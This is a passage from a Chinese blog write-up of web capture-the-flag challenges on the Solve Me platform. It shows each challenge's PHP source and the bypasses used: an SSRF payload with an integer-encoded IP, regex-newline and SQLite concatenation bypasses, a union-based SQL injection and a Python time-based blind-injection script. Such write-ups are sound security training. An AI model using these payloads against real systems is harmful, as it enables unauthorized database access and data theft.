class="line">            die(&apos;Failed to create socket&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host = gethostbyname($parse[&apos;host&apos;]);</span><br><span class="line">        $port = is_null($parse[&apos;port&apos;]) ? 80 : $parse[&apos;port&apos;];</span><br><span class="line"></span><br><span class="line">        if(socket_connect($socket, $host, $port) === false)&#123;</span><br><span class="line">            die(&apos;Failed to connect&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send = &quot;HEAD /&quot;.$flag.&quot; HTTP/1.1\r\n&quot;.</span><br><span class="line">            &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;.</span><br><span class="line">            &quot;Connection: Close\r\n&quot;.</span><br><span class="line">            &quot;\r\n\r\n&quot;;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv = socket_read($socket, 1024);var_dump($recv);</span><br><span class="line">        if(!preg_match(&apos;/^HTTP\/1.1 200 OK\r\n/&apos;, $recv))&#123;</span><br><span class="line">            die(&apos;Not allowed response&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        echo &apos;Okay, I sent the flag.&apos;, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>这个题目和前面一个题目类似，但是这里对host有了新的要求:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&apos;/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i&apos;, $parse[&apos;host&apos;]))&#123;</span><br><span class="line">    die(&apos;Not allowed host&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>正则要求以localhost和127开头，可以用ip2long来绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note:</span><br><span class="line"></span><br><span class="line">因为PHP的 integer 类型是有符号，并且有许多的IP地址讲导致在32位系统的情况下为负数， 你需要使用 &quot;%u&quot; 进行转换通过 sprintf() 或 printf() 得到的字符串来表示无符号的IP地址。</span><br></pre></td></tr></table></figure>
<p>在手册中有如上Note，这里如果直接代入负数是不能正常访问的，所以我们要把他转换为无符号的ip地址。</p>
<p>构造脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$ip =&apos;182.254.0.0&apos;;</span><br><span class="line">	echo ip2long($ip),&apos;&lt;br&gt;&apos;;		//-1224867840</span><br><span class="line">	printf(&quot;%u\n&quot;, ip2long($ip));	//3070099456</span><br></pre></td></tr></table></figure>
<p>这里我们代入3070099456发送payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink2.solveme.peng.kr/?url=http://3070099456/plz%01give%01me</span><br></pre></td></tr></table></figure></p>
<p>这里就可以在web服务器日志中查看flag。</p>
<h2><span id="replace-filter">Replace filter</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;say&apos;]) &amp;&amp; strlen($_GET[&apos;say&apos;]) &lt; 20)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(&apos;/^(.*)flag(.*)$/&apos;, &apos;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&apos;, $_GET[&apos;say&apos;]);</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/give_me_the_flag/&apos;, $say))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;What the f**k?&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^(.*)flag(.*)$/</span><br></pre></td></tr></table></figure>
<p>以上正则是存在一个缺陷的，<code>^ $</code>界定了必须在同一行，否则匹配不到,所以我们可以用换行符进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://replacefilter.solveme.peng.kr?say=%0agive_me_the_flag</span><br></pre></td></tr></table></figure>
<h2><span id="hell-js">Hell JS</span></h2><p>打开题目，查看源码发现是jsfuck。</p>
<p>一般这种题目是可以直接控制台运行的。但是这里是不行的，</p>
<p>先了解下jsfuck的编码格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">alert(1) 	=&gt; [][&quot;filter&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()</span><br></pre></td></tr></table></figure>
<p>从这里我们可以看出我们可以根据括号匹配提取出<code>alert(1)</code>的jsfuck代码，而这串代码放到控制台是可以直接运行看到加密之前的结果的。</p>
<p>如下图：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/jsfuck.png" alt=""></p>
<p>用同样的方法，我们去提取这一串jsfuck代码。这里可以用sublime text来进行括号的匹配</p>
<p><code>ctrl+shift+空格</code> 快捷键匹配</p>
<p>经过几次匹配就能得到jsfuck代码</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/jsfuck1.png" alt=""></p>
<h2><span id="anti-sqli">Anti SQLi</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // It&apos;s &apos;Anti SQLi&apos; problem of &apos;Solve Me&apos;.</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;; </span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $pw = $_GET[&apos;pw&apos;];</span><br><span class="line"></span><br><span class="line">    if(isset($id, $pw))&#123;</span><br><span class="line">        preg_match(</span><br><span class="line">            &apos;/\.|\`|&quot;|\&apos;|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|&apos;.</span><br><span class="line">            &apos;=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|&apos;.</span><br><span class="line">            &apos;0x[0-9a-f]+|0b[01]+|x\&apos;[0-9a-f]+\&apos;|b\&apos;[01]+\&apos;|&apos;.</span><br><span class="line">            &apos;[\s\xA0\&apos;&quot;]+(as|or|and|r*like|regexp)[\s\xA0\&apos;&quot;]+|&apos;.</span><br><span class="line">            &apos;union[\s\xA0]+select|[\s\xA0](where|having)|&apos;.</span><br><span class="line">            &apos;[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|&apos;.</span><br><span class="line">            &apos;information_schema|procedure\s+analyse\s*/is&apos;,</span><br><span class="line">            $id.&apos;,&apos;.$pw</span><br><span class="line">        ) and die(&apos;Hack detected&apos;);</span><br><span class="line"></span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            or die(&apos;SQL server down&apos;);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                &quot;SELECT * FROM `antisqli` WHERE `id`=&apos;&#123;$id&#125;&apos; AND `pw`=md5(&apos;&#123;$pw&#125;&apos;);&quot;</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        if(isset($result))&#123;</span><br><span class="line">            if($result[&apos;no&apos;] === &apos;31337&apos;)&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &apos;Hello, &apos;, $result[&apos;id&apos;];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;Login failed&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>在正则里的第一行<code>|\\|</code>没有匹配到<code>\</code>,所以这个相当于完全没用, 匹配到<code>\</code>，需要<code>四个\</code>。因为<code>\</code>没有被过滤也给了我们逃逸单引号的条件, 只要<code>$_GET[&#39;id&#39;] = 1\</code>就可以逃逸出第一个单引号</p>
<p>在正则中的第二行<code>|#|--[\s\xA0]|</code> 过了用来注释的<code>#</code>和<code>--</code>这里的可以用<code>--</code>加一个不可见字符替代，例如:<code>%01 %11 %02</code>等</p>
<blockquote>
<p>直接尝试?id=1\&amp;pw=–%01 仍然显示login failed, 而这在本地测试中是可行的, 原因是本地测试中 id 被设置为INT, 而在题目中猜测 id  被设置为了VARCHAR, 于是考虑重新构造一个 union 查询</p>
</blockquote>
<p>正则中过滤了 union[\s\xA0]+select 但是可以直接用 union all select 来绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 31337,31337,31337 from antisqli --%11</span><br></pre></td></tr></table></figure>
<h2><span id="name-check">Name check</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;; </span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;name&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        $name = $_GET[&apos;name&apos;];</span><br><span class="line">        if(preg_match(&quot;/admin|--|;|\(\)|\/\*|\\0/i&quot;, $name))&#123;</span><br><span class="line">            echo &apos;Not allowed input&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $sql = new SQLite3(&apos;name_check.db&apos;, SQLITE3_OPEN_READWRITE);</span><br><span class="line">        $res = $sql-&gt;query(&quot;</span><br><span class="line">            SELECT </span><br><span class="line">            MAX(&apos;0&apos;,&apos;1&apos;,&apos;&#123;$name&#125;&apos;) LIKE &apos;a%&apos;, </span><br><span class="line">            INSTR(&apos;&#123;$name&#125;&apos;,&apos;d&apos;)&gt;0, </span><br><span class="line">            MIN(&apos;&#123;$name&#125;&apos;,&apos;b&apos;,&apos;c&apos;) LIKE &apos;__m__&apos;, </span><br><span class="line">            SUBSTR(&apos;&#123;$name&#125;&apos;,-2)=&apos;in&apos;</span><br><span class="line">        ;&quot;);</span><br><span class="line">        if($res === false)&#123;</span><br><span class="line">            echo &apos;Database error&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">        if(</span><br><span class="line">            $row[0] + $row[1] + $row[2] + $row[3] !== 4 ||</span><br><span class="line">            array_sum($row) !== 4 </span><br><span class="line">        )&#123;</span><br><span class="line">            echo &apos;Auth failed&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo $flag;</span><br><span class="line"></span><br><span class="line">    quit:</span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>从上面代码中可以看出满足 <code>row[0] + $row[1] + $row[2] + $row[3] = 4</code> 就能输出flag。这个表达式的意思就是<code>sql</code>语句四个都为true。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MAX(&apos;0&apos;,&apos;1&apos;,&apos;&#123;$name&#125;&apos;) LIKE &apos;a%&apos;, 			\\name的首字母为a</span><br><span class="line">INSTR(&apos;&#123;$name&#125;&apos;,&apos;d&apos;)&gt;0, 					\\name中有d</span><br><span class="line">MIN(&apos;&#123;$name&#125;&apos;,&apos;b&apos;,&apos;c&apos;) LIKE &apos;__m__&apos;, 		\\name中间的字母为m</span><br><span class="line">SUBSTR(&apos;&#123;$name&#125;&apos;,-2)=&apos;in&apos;					\\name以in结尾</span><br></pre></td></tr></table></figure>
<p>从上面的代码可以看出这里需要传入的<code>$name</code>的值就是<code>admin</code>，但是上面有正则过滤了<code>admin</code></p>
<p>sqlite的特性考虑查阅手册发现:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLite中，连接字符串不是使用+，而是使用||</span><br></pre></td></tr></table></figure></p>
<p>且<code>||</code>没有被过滤 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://namecheck.solveme.peng.kr/?name=adm&apos;||&apos;in</span><br></pre></td></tr></table></figure>
<h2><span id="i-am-slowly">I am slowly</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // It&apos;s &apos;I am slowly&apos; problem of &apos;Solve Me&apos;.</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;; </span><br><span class="line"></span><br><span class="line">    $table = &apos;iamslowly_&apos;.ip2long($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    $answer = $_GET[&apos;answer&apos;];</span><br><span class="line"></span><br><span class="line">    if(isset($answer))&#123;</span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            or die(&apos;SQL server down&apos;);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, &quot;SELECT `count` FROM `&#123;$table&#125;`;&quot;)</span><br><span class="line">        );</span><br><span class="line">        if(!isset($result))&#123;</span><br><span class="line">            mysqli_query($con, &quot;CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);&quot;);</span><br><span class="line">            $new_answer = md5(sha1(&apos;iamslowly_&apos;.mt_rand().&apos;_&apos;.mt_rand().&apos;_&apos;.mt_rand()));</span><br><span class="line">            mysqli_query($con, &quot;INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES (&apos;&#123;$new_answer&#125;&apos;,1);&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;elseif($result[&apos;count&apos;] === &apos;12&apos;)&#123;</span><br><span class="line">            mysqli_query($con, &quot;DROP TABLE `&#123;$table&#125;`;&quot;);</span><br><span class="line">            echo &apos;Game over&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime = mt_rand(1, 10);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, &quot;SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`=&apos;&#123;$answer&#125;&apos;;&quot;)</span><br><span class="line">        );</span><br><span class="line">        if(isset($result) &amp;&amp; $result[&apos;answer&apos;] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, &quot;DROP TABLE `&#123;$table&#125;`;&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            mysqli_query($con, &quot;UPDATE `&#123;$table&#125;` SET `count`=`count`+1;&quot;);</span><br><span class="line">            echo &apos;Go fast&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码前面是连接MySQL数据库，并判断当前ip的信息是否存在，若不存在插入新的记录。</p>
<p>这里对<code>count</code>值进行判断，如果<code>count</code>的值等于12就把数据库中跟当前ip有关的表删除。</p>
<p><code>mysqli_query($con, &quot;SELECT * FROM</code>{$table}<code>WHERE sleep({$randtime}) OR</code>answer<code>=&#39;{$answer}&#39;;&quot;)</code></p>
<p>这里可以利用<code>answer</code>进行延迟盲注，但是如果我们请求的次数等于12时就会被删表。</p>
<p>所以我们需要绕过<code>count = 12</code>这一个判断,这里有个问题就是代码是先执行SQL语句查询，再执行<code>count++</code>。</p>
<p>所以可以在<code>count = 11</code>时加入<code>sleep(50)</code>一个比较长的延迟时间。这个时候立即再发一个请求。这个时候<code>count = 12</code>了,</p>
<p>等之前的<code>count = 11</code>的请求完成时，此时的<code>count = 13</code>了，这样就绕过了限制，可以无限的进行请求了。</p>
<p>至此我们就可以用写好的盲注脚本跑盲注了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer = &quot;&quot;</span><br><span class="line">for i in range(1, 33):</span><br><span class="line">    for j in &quot;abcdef1234567890&quot;:</span><br><span class="line">        url = &quot;http://iamslowly.thinkout.rf.gd/?answer=&apos; or if((answer like &apos;%s%%&apos;),sleep(30),1)%%23&quot; % (</span><br><span class="line">            answer + j)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url=url, timeout=29)</span><br><span class="line">            print(&quot;i:&quot;, i, &quot;j:&quot;, j, r.content[:10])</span><br><span class="line">        except:</span><br><span class="line">            answer += j</span><br><span class="line">            print(&quot;answer:&quot;, answer)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>提交answer,得到flag.</p>
<h2><span id="reference">Reference</span></h2><p><a href="http://www.freebuf.com/articles/web/165537.html" target="_blank" rel="noopener">Solveme.peng.kr平台Web题解</a></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/正方教务系统验证码识别.html" class="prev">上一篇</a><a href="/posts/notes/同源策略和跨域访问学习笔记.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>